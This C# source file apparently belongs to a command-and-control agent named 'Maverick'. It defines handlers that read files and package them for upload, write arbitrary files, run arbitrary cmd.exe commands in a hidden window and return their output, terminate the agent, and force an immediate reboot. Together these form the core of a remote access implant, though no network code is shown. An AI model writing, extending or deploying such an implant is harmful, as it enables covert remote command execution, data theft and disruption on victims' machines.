using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Text.Json;

namespace Maverick.Agent
{
    public static class ActionFunction
    {
        public static byte[] PerformReadFile(string name)
        {
            try
            {
                if (!File.Exists(name))
                {
                    return null;
                }
                var data = File.ReadAllBytes(name);
                var model = new FileUploadModel
                {
                    FileName = Path.GetFileName(name),
                    FileData = data
                };
                return Encoding.UTF8.GetBytes(JsonSerializer.Serialize(model));
            }
            catch (Exception)
            {
                return null;
            }
        }


        public static bool PerformWriteFile(string name, byte[] data)
        {
            try
            {
                File.WriteAllBytes(name, data);
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        public static byte[] PerformDoCommand(string command)
        {
            try
            {
                System.Diagnostics.Process process = new System.Diagnostics.Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/c " + command;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();
                return Encoding.UTF8.GetBytes(output);
            }
            catch (Exception)
            {
                return null;
            }
        }

        public static void PerformKillSystem()
        {
            Environment.Exit(0);
        }

        public static void PerformRebotSystem()
        {
            System.Diagnostics.Process.Start("shutdown", "/r /f /t 0");
        }
    }
}
